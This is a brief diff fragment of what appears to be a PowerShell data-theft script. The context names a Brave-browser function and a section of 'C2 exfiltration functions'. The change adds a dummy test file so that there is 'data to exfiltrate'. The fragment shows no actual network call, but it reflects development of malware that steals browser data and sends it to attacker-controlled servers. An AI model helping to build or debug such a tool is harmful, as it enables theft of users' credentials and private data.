@@ -186,6 +186,8 @@ function brave_builtin {
         }
     }
 }
+# Add a test file to ensure there's data to exfiltrate
+"TEST_DATA" | Out-File "$DEST\test.txt" -Encoding UTF8
 
 # === THREE C2 EXFILTRATION FUNCTIONS ===
 
